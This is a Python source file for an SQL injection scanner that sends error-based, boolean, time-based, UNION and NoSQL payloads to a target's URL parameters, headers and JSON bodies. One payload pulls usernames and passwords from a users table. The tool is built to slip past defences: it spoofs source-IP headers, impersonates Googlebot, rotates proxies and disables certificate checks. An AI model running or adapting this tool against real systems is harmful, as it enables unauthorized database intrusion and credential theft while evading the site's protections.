# -------------------------------
# Enhanced SQL Injection Scanner
# -------------------------------
import requests
import time
import re
import random
import difflib
from urllib.parse import urlparse, parse_qs, quote, urlencode
from config import SCAN_CONFIG

class SQLiScanner:
    def __init__(self, proxies=None):
        self.config = SCAN_CONFIG
        self.session = requests.Session()
        self.proxies = proxies if proxies else []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ]
        self._configure_session()

    def _configure_session(self):
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        self.session.verify = False
        self.session.max_redirects = 3

    def scan_url(self, url):
        """Main scanning method that tests all injection vectors"""
        results = []
        
        # Test standard URL parameters
        results.extend(self._perform_scan(url))
        
        # Test with WAF evasion techniques if no results found
        if not results:
            results.extend(self._perform_scan(url, evade_waf=True))
        
        return results

    def _prepare_base_url(self, url):
        """Prepare base URL for parameter testing"""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _get_normal_response(self, url, evade_waf=False):
        """Get baseline response for comparison"""
        try:
            return self._execute_request(url, evade_waf=evade_waf)
        except Exception as e:
            print(f"Error getting normal response: {e}")
            return None

    def _get_parameters_to_test(self, parsed_url):
        """Extract parameters from URL or use defaults"""
        params = parse_qs(parsed_url.query)
        if params:
            return list(params.keys())
        return self.config["DEFAULT_PARAMS"]

    def _rotate_headers(self):
        """Rotate headers for new requests"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
        })

    def _test_parameter(self, base_url, param, normal_res, results, evade_waf=False):
        """Enhanced parameter testing with specific vulnerability types"""
        payloads = self._get_payloads(evade_waf)
        
        for payload in payloads:
            try:
                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._execute_request(test_url, evade_waf=evade_waf)
                
                if self._is_vulnerable(response, normal_res, payload):
                    vuln_type = self._determine_vulnerability_type(payload)
                    severity = self._determine_severity(payload, response.text)
                    
                    results.append({
                        'param': param,
                        'payload': payload,
                        'type': vuln_type,
                        'response': response.text,
                        'severity': severity
                    })
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")

    def _determine_vulnerability_type(self, payload):
        """Classify the specific type of SQL injection"""
        payload = payload.lower()
        
        if any(p in payload for p in ["sleep(", "benchmark(", "waitfor"]):
            return "Time-Based Blind SQLi"
        
        if "union select" in payload:
            return "Union-Based SQLi"
        
        if any(p in payload for p in ["convert(", "cast(", "exec(", "xp_cmdshell"]):
            return "Function-Based SQLi"
        
        if any(p in payload for p in ["information_schema", "pg_catalog"]):
            return "Database Enumeration"
        
        if any(p in payload for p in ["@@version", "version()", "db_name("]):
            return "Version Disclosure"
        
        if any(p in payload for p in [" or ", " and "]) and ("1=1" in payload or "'1'='1" in payload):
            return "Boolean-Based SQLi"
        
        if any(p in payload for p in ["'", "\"", "`"]):
            return "Error-Based SQLi"
        
        return "SQL Injection"

    def _get_payloads(self, evade_waf=False):
        """Get appropriate payloads based on scan mode"""
        if evade_waf:
            return self.config["BLIND_PAYLOADS"] + [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT null,username,password FROM users--",
                "' AND 1=CONVERT(int,@@version)--"
            ]
        return [
            "'", "\"", "`", 
            "')", "\")", "`)", 
            "';", "\";", "`;",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,@@version,null--",
            "' AND 1=CONVERT(int,@@version)--",
            "' OR SLEEP(5)--",
            "' AND 1=IF(2>1,SLEEP(5),0)--"
        ]

    def _is_vulnerable(self, response, normal_response, payload):
        """Enhanced vulnerability detection"""
        if not normal_response:
            return False
            
        # Check for error patterns
        if self._check_response_for_errors(response):
            return True
            
        # Check for time-based vulnerabilities
        if any(p in payload.lower() for p in ['sleep', 'waitfor', 'benchmark']):
            if response.elapsed.total_seconds() > 2:
                return True
                
        # Check for content differences
        diff_ratio = difflib.SequenceMatcher(
            None,
            normal_response.text,
            response.text
        ).ratio()
        
        # Check for database information leaks
        db_patterns = [
            r"Microsoft SQL Server", r"MySQL", r"Oracle",
            r"PostgreSQL", r"SQLite", r"MariaDB"
        ]
        
        if any(re.search(p, response.text) for p in db_patterns):
            return True
            
        return diff_ratio < 0.85

    def _determine_severity(self, payload, response_text):
        """Determine severity based on payload and response"""
        critical_patterns = [
            r'sleep\(', r'benchmark\(', r'shutdown', 
            r'drop\s+table', r'xp_cmdshell', r'load_file\('
        ]
        
        high_patterns = [
            r'union\s+select', r'information_schema',
            r'@@version', r'database\(\)'
        ]
        
        if any(re.search(p, payload, re.IGNORECASE) for p in critical_patterns):
            return 'Critical'
            
        if any(re.search(p, payload, re.IGNORECASE) for p in high_patterns):
            return 'High'
            
        if 'database' in response_text.lower() or 'sql' in response_text.lower():
            return 'Medium'
            
        return 'Low'

    def _perform_scan(self, base_url, evade_waf=False):
        """Enhanced scanning with multiple attack vectors"""
        results = []
        parsed = urlparse(base_url)
        
        # Test headers first
        self._test_header_injection(base_url, results)
        
        # Test JSON parameters
        self._test_json_params(base_url, results)
        
        # Normal parameter testing
        base_url = self._prepare_base_url(base_url)
        normal_res = self._get_normal_response(base_url, evade_waf)
        
        if normal_res:
            params = self._get_parameters_to_test(parsed)
            for param in params:
                self._test_parameter(base_url, param, normal_res, results, evade_waf)
        
        return results

    def _test_header_injection(self, url, results):
        """Test for header-based SQLi"""
        headers_to_test = {
            'X-Forwarded-Host': "' OR 1=1 --",
            'Referer': "http://evil.com' AND 1=1 --",
            'User-Agent': "' UNION SELECT 1,2,3--"
        }
        
        for header, payload in headers_to_test.items():
            try:
                temp_headers = self.session.headers.copy()
                temp_headers[header] = payload
                response = self._execute_request(url, headers=temp_headers)
                if self._check_response_for_errors(response):
                    results.append({
                        'type': 'Header Injection',
                        'header': header,
                        'payload': payload,
                        'evidence': "Error patterns detected in headers",
                        'severity': 'High'
                    })
            except Exception as e:
                print(f"[ERROR] Header test failed: {str(e)}")

    def _test_json_params(self, url, results):
        """Test JSON/XML parameters"""
        json_payloads = [
            {'id': "1' OR 1=1--"},
            {'filter': "{'$where': '1=1'}"},
            {'query': "{\"$gt\": \"\"}"}
        ]
        
        for payload in json_payloads:
            try:
                response = self._execute_request(url, method='POST', json=payload)
                if self._check_response_for_errors(response):
                    results.append({
                        'type': 'JSON Injection',
                        'payload': str(payload),
                        'evidence': "Error patterns detected in JSON response",
                        'severity': 'High'
                    })
            except Exception as e:
                print(f"[ERROR] JSON test failed: {str(e)}")

    def _check_response_for_errors(self, response):
        """Unified error detection"""
        error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql",
            r"Microsoft OLE DB Provider", r"Unclosed quotation mark",
            r"PostgreSQL.*ERROR", r"pg_exec",
            r"ORA-\d{5}", r"Oracle error",
            r"Syntax error", r"SQL command.*properly",
            r"You have an error in your SQL syntax"
        ]
        return any(re.search(p, response.text) for p in error_patterns)

    def _execute_request(self, url, method='GET', headers=None, json=None, evade_waf=False, retries=3):
        """Enhanced request handler with multiple methods"""
        try:
            kwargs = {
                'timeout': self.config["TIMEOUT"],
                'headers': headers or self.session.headers
            }
            if json:
                kwargs['json'] = json
            
            if self.proxies:
                kwargs['proxies'] = {'http': random.choice(self.proxies)}
            
            if evade_waf:
                # Add evasion techniques
                kwargs['headers']['X-Forwarded-For'] = '127.0.0.1'
                kwargs['headers']['X-Originating-IP'] = '127.0.0.1'
                kwargs['headers']['X-Remote-IP'] = '127.0.0.1'
                kwargs['headers']['X-Remote-Addr'] = '127.0.0.1'
            
            if method.upper() == 'GET':
                return self.session.get(url, **kwargs)
            else:
                return self.session.post(url, **kwargs)
                
        except requests.exceptions.ConnectionError:
            if retries > 0:
                self._rotate_headers()
                time.sleep(2)
                return self._execute_request(url, method, headers, json, evade_waf, retries-1)
            raise

def get_scanner(proxies=None):
    return SQLiScanner(proxies=proxies)